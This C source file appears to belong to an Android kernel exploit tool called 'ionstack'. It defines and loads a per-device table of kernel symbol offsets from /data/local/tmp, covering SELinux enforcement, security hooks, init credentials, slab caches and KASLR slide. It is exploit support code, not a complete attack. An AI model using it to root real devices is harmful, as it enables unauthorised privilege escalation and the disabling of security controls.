#include "common.h"

struct ksym_config g_ksym = {
  .kimage_text_base = KIMAGE_TEXT_BASE_DEFAULT,

  .random_misc_fops_off = RANDOM_MISC_FOPS_OFF,
  .ashmem_misc_fops_off = ASHMEM_MISC_FOPS_OFF,
  .ashmem_fops_off = ASHMEM_FOPS_OFF,
  .ashmem_ioctl_off = ASHMEM_IOCTL_OFF,
  .ashmem_compat_ioctl_off = ASHMEM_COMPAT_IOCTL_OFF,
  .ashmem_mmap_off = ASHMEM_MMAP_OFF,
  .ashmem_open_off = ASHMEM_OPEN_OFF,
  .ashmem_release_off = ASHMEM_RELEASE_OFF,
  .ashmem_show_fdinfo_off = ASHMEM_SHOW_FDINFO_OFF,
  .ashmem_read_iter_off = ASHMEM_READ_ITER_OFF,
  .configfs_read_file_off = CONFIGFS_READ_FILE_OFF,
  .configfs_write_bin_file_off = CONFIGFS_WRITE_BIN_FILE_OFF,
  .copy_splice_read_off = COPY_SPLICE_READ_OFF,
  .noop_llseek_off = NOOP_LLSEEK_OFF,

  .init_task_off = INIT_TASK_OFF,
  .init_uts_ns_off = INIT_UTS_NS_OFF,
  .empty_zero_page_off = EMPTY_ZERO_PAGE_OFF,
  .root_task_group_off = ROOT_TASK_GROUP_OFF,
  .selinux_blob_sizes_off = SELINUX_BLOB_SIZES_OFF,
  .selinux_enforcing_off = SELINUX_ENFORCING_OFF,
  .security_hook_heads_off = SECURITY_HOOK_HEADS_OFF,
  .kmalloc_caches_off = KMALLOC_CACHES_OFF,
  .anon_pipe_buf_ops_off = ANON_PIPE_BUF_OPS_OFF,

  .slide_random_boot_id_data_off = SLIDE_RANDOM_BOOT_ID_DATA_OFF,
  .slide_sysctl_bootid_off = SLIDE_SYSCTL_BOOTID_OFF,
  .slide_loggers_0_1_off = SLIDE_LOGGERS_0_1_OFF,
  .slide_nfulnl_logger_off = SLIDE_NFULNL_LOGGER_OFF,

#ifdef INIT_CRED_OFF
  .init_cred_off = INIT_CRED_OFF,
#endif
#ifdef PANIC_SCRATCH_OFF
  .panic_scratch_off = PANIC_SCRATCH_OFF,
#endif
#ifdef DUMP_SKIP_ZEROES_OFF
  .dump_skip_zeroes_off = DUMP_SKIP_ZEROES_OFF,
#endif
};

#define KSYM_CONFIG_ENV "IONSTACK_CONFIG"
#define KSYM_CONFIG_DEFAULT_PATH "/data/local/tmp/ionstack.conf"

static const struct {
  const char *name;
  size_t field_off;
} ksym_keys[] = {
#define KSYM_KEY(field) { #field, offsetof(struct ksym_config, field) }
  KSYM_KEY(kimage_text_base),

  KSYM_KEY(random_misc_fops_off),
  KSYM_KEY(ashmem_misc_fops_off),
  KSYM_KEY(ashmem_fops_off),
  KSYM_KEY(ashmem_ioctl_off),
  KSYM_KEY(ashmem_compat_ioctl_off),
  KSYM_KEY(ashmem_mmap_off),
  KSYM_KEY(ashmem_open_off),
  KSYM_KEY(ashmem_release_off),
  KSYM_KEY(ashmem_show_fdinfo_off),
  KSYM_KEY(ashmem_read_iter_off),
  KSYM_KEY(configfs_read_file_off),
  KSYM_KEY(configfs_write_bin_file_off),
  KSYM_KEY(copy_splice_read_off),
  KSYM_KEY(noop_llseek_off),

  KSYM_KEY(init_task_off),
  KSYM_KEY(init_uts_ns_off),
  KSYM_KEY(empty_zero_page_off),
  KSYM_KEY(root_task_group_off),
  KSYM_KEY(selinux_blob_sizes_off),
  KSYM_KEY(selinux_enforcing_off),
  KSYM_KEY(security_hook_heads_off),
  KSYM_KEY(kmalloc_caches_off),
  KSYM_KEY(anon_pipe_buf_ops_off),

  KSYM_KEY(slide_random_boot_id_data_off),
  KSYM_KEY(slide_sysctl_bootid_off),
  KSYM_KEY(slide_loggers_0_1_off),
  KSYM_KEY(slide_nfulnl_logger_off),

  KSYM_KEY(init_cred_off),
  KSYM_KEY(panic_scratch_off),
  KSYM_KEY(dump_skip_zeroes_off),
#undef KSYM_KEY
};

static int ksym_config_apply(const char *key, uint64_t value) {
  for (size_t i = 0; i < sizeof(ksym_keys) / sizeof(ksym_keys[0]); i++) {
    if (strcmp(key, ksym_keys[i].name) != 0) {
      continue;
    }
    uint64_t *field =
      (uint64_t *)((char *)&g_ksym + ksym_keys[i].field_off);
    *field = value;
    return 1;
  }
  return 0;
}

int ksym_config_load(const char *path) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }

  char text[4096];
  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return -1;
  }
  text[n] = 0;

  int applied = 0;
  char *save = NULL;
  for (char *line = strtok_r(text, "\n", &save); line;
       line = strtok_r(NULL, "\n", &save)) {
    char *p = line;
    while (*p == ' ' || *p == '\t' || *p == '\r') {
      p++;
    }
    if (*p == 0 || *p == '#') {
      continue;
    }

    char *eq = strchr(p, '=');
    if (!eq) {
      continue;
    }
    char *key = p;
    char *val = eq + 1;
    while (eq > key && (eq[-1] == ' ' || eq[-1] == '\t')) {
      eq--;
    }
    *eq = 0;
    while (*val == ' ' || *val == '\t') {
      val++;
    }
    char *end = val;
    while (*end && *end != ' ' && *end != '\t' && *end != '\r' &&
           *end != '#') {
      end++;
    }
    *end = 0;
    if (!*key || !*val) {
      continue;
    }

    errno = 0;
    char *num_end = NULL;
    uint64_t value = strtoull(val, &num_end, 0);
    if (errno != 0 || num_end == val || *num_end != 0) {
      pr_warning("Ksym config: bad value '%s' for key '%s'\n", val, key);
      continue;
    }
    if (!ksym_config_apply(key, value)) {
      pr_debug("Ksym config: unknown key '%s' ignored\n", key);
      continue;
    }
    applied++;
  }
  return applied;
}

void ksym_config_init(void) {
  const char *label = ksym_config_select_for_device();
  if (label) {
    pr_info("Target: matched %s\n", label);
  }

  const char *path = getenv(KSYM_CONFIG_ENV);
  if (!path || !*path) {
    path = KSYM_CONFIG_DEFAULT_PATH;
  }

  int applied = ksym_config_load(path);
  if (applied > 0) {
    pr_info("Ksym config: applied %d overrides from %s\n", applied, path);
  } else if (applied < 0 && getenv(KSYM_CONFIG_ENV)) {
    pr_warning("Ksym config: cannot read %s (errno=%d)\n", path, errno);
  }
}
